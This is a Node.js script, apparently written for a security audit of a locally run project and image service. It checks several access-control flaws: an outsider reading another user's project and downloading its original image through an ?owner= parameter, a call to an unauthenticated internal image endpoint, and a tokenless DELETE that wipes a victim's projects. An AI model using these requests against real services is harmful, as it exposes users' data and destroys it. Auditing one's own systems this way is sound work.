import { GW, register, bearer, createProject, getProject, uploadFile, request } from './lib.mjs';
import { execFileSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import fs from 'node:fs';
const DIR = new URL('.', import.meta.url).pathname;
const owner = await register('free'), outsider = await register('free');
const proj = await createProject(owner, 'victim-secret-name'); await getProject(owner, proj);
await uploadFile(GW + `projects/${owner.id}/${proj.id}/img`, 'image', DIR + 'probe.png', 'probe.png', 'image/png', { ...bearer(owner), 'X-Project-Version': String(proj.version) });
const mine = (await getProject(owner, proj)).data;
let r = await request('GET', GW + `projects/${outsider.id}/${proj.id}?owner=${owner.id}`, { headers: bearer(outsider) });
console.log('G02', r.status, 'same _id:', r.data?._id === mine._id, 'name leaked:', r.data?.name === 'victim-secret-name', 'media:', r.data?.imgs?.length);
r = await request('GET', GW + `projects/${outsider.id}/${proj.id}/imgs?owner=${owner.id}`, { headers: bearer(outsider) });
let ok = false;
if (r.status === 200 && Array.isArray(r.data) && r.data[0]?.url) { const u = r.data[0].url.replace('https://localhost:28080', 'https://localhost:28080'); const d = await request('GET', u); ok = createHash('sha256').update(d.raw).digest('hex') === createHash('sha256').update(fs.readFileSync(DIR + 'probe.png')).digest('hex'); }
console.log('G02b imgs', r.status, 'outsider downloaded original bytes via gateway:', ok);
const key = mine.imgs[0].og_img_key;
r = await request('GET', `http://localhost:31000/image/internal/${owner.id}/${proj.id}/src/${key}`);
const h = execFileSync('docker', ['exec', '-i', 'picturas-nfr-projects-1', 'node', '-e', `require('http').get(${JSON.stringify(r.data.url)},s=>{const c=require('crypto').createHash('sha256');s.on('data',d=>c.update(d));s.on('end',()=>console.log(s.statusCode,c.digest('hex')))})`], { encoding: 'utf8' }).trim();
console.log('D06', r.status, h.split(' ')[0], 'match:', h.split(' ')[1] === createHash('sha256').update(fs.readFileSync(DIR + 'probe.png')).digest('hex'));
// D05b: tokenless DELETE /:user on projects for an account WITH a project
const v = await register('free'); const vp = await createProject(v, 'to-be-deleted');
r = await request('DELETE', `https://localhost:29002/${v.id}`);
const left = await request('GET', GW + `projects/${v.id}`, { headers: bearer(v) });
console.log('D05b', r.status, 'projects left for victim:', Array.isArray(left.data) ? left.data.length : left.status);
